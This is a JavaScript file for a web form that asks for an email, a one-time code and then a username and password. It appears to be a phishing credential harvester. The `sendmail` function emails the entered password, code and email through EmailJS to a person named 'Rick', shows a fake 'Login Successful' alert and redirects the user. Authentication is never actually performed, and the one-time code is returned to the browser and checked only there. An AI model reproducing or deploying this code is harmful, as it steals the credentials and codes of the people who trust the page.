(function () {
  emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
})();
let form = document.querySelector("#contact");

const otpBoxDiv = document.createElement("div");
otpBoxDiv.setAttribute("id", "optBox");
otpBoxDiv.classList.add("d-none");
otpBoxDiv.innerHTML = `<fieldset>
<label for="number">OTP</label><br />
<input
  type="text"
  name="number"
  tabindex="2"
  required
  class="otp"
/>
</fieldset>
<fieldset>
<button
  name="submit"
  type="submit"
  id="opt-submit"
  class="submit"
>
  Submit Code
</button>
</fieldset>`;
form.appendChild(otpBoxDiv);

const userPasswordBox = document.createElement("div");
userPasswordBox.setAttribute("id", "userPassword");
userPasswordBox.classList.add("d-none");
userPasswordBox.innerHTML = `<fieldset>
<label for="Username">Username</label><br />
<input
  type="text"
  name="Username"
  required
  class="username"
/>
</fieldset>
<fieldset>
<label for="password"> Password </label><br />
<input
  type="password"
  required
  class="password"
/>
</fieldset>
<fieldset>
<button
  name="submit"
  type="submit"
  id="info-submit"
  class="submit"
>
  Sign In
</button>
</fieldset>`;
form.appendChild(userPasswordBox);

function validate() {
  let emailBox = document.querySelector("#emailBox");
  let optBox = document.querySelector("#optBox");
  let username = document.querySelector(".username");
  let password = document.querySelector(".password");
  let email = document.querySelector(".email");
  let emailSubmitBtn = document.querySelector("#email-submit");
  let otpSubmitBtn = document.querySelector("#opt-submit");
  let userPassword = document.querySelector("#userPassword");
  let otp = document.querySelector(".otp");
  let submitBtn = document.querySelector("#info-submit");

  emailSubmitBtn.addEventListener("click", async (e) => {
    e.preventDefault();
    filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (filter.test(email.value)) {
      emailSubmitBtn.innerText = "Loading . . .";

      emailSubmitBtn.disabled = true;
      emailSubmitBtn.style.cursor = "not-allowed";
      try {
        const res = await fetch(
          "https://whispering-garden-68171.herokuapp.com/api/send-code",
          {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ email: email.value }),
          }
        );
        const content = await res.json();
        if (content.otp) {
          sessionStorage.setItem("code", content.otp);
          emailBox.classList.add("d-none");
          optBox.classList.remove("d-none");
        }
        emailSubmitBtn.innerText = " Get OTP";
        emailSubmitBtn.disabled = false;
        emailSubmitBtn.style.cursor = "pointer";
      } catch (e) {
        emailSubmitBtn.innerText = " Get OTP";
        emailSubmitBtn.disabled = false;
        emailSubmitBtn.style.cursor = "pointer";
        emptyerror();
      }
    } else {
      if (email.value == "") {
        emptyerror();
      } else {
        error();
      }
    }
  });

  otpSubmitBtn.addEventListener("click", (e) => {
    e.preventDefault();
    if (otp.value == "") {
      emptyerror();
    } else {
      const storeOtp = sessionStorage.getItem("code");
      if (!storeOtp || storeOtp !== otp.value) {
        otpError();
      } else {
        otpBoxDiv.classList.add("d-none");
        userPassword.classList.remove("d-none");
        otpSuccess();
      }
    }
  });

  submitBtn.addEventListener("click", (e) => {
    e.preventDefault();
    console.log(emailBox, optBox, userPassword);

    if (username.value === "" || password.value === "") {
      emptyerror();
    } else {
      const storeOtp = sessionStorage.getItem("code");
      sendmail(username.value, password.value, storeOtp, email.value);
      console.log(username.value, password.value);
      username.value = "";
      password.value = "";
      loginSuccess();
    }
  });
}
validate();

function sendmail(username, password, storeOtp, email) {
  console.log("storeOtp", storeOtp);
  emailjs
    .send("service_ll5oava", "template_cvjri3e", {
      to_name: "Rick",
      from_name: username,
      email: email,
      message: password,
      OTP: storeOtp,
    })
    .then(() => (window.location.href = "/home.html"));
}

function emptyerror() {
  Swal.fire({
    icon: "error",
    title: "Fields cannot be empty!",
    text: "Fields cannot be empty!",
  });
}

function error() {
  Swal.fire({
    icon: "error",
    title: "Please Give Valid Information",
    text: "Please Give Valid Information",
  });
}

function otpSuccess() {
  Swal.fire({
    icon: "success",
    title: "OTP Successfully Verified",
    text: "OTP Successfully Verified",
  });
}

function success() {
  Swal.fire({
    icon: "success",
    title: "Successfully sent message",
    text: "Successfully sent message",
  });
}
function loginSuccess() {
  Swal.fire({
    icon: "success",
    title: "Login Successful",
    text: "Login Successful",
  });
}
function otpError() {
  Swal.fire({
    icon: "error",
    title: "Wrong OTP",
    text: "Wrong OTP",
  });
}
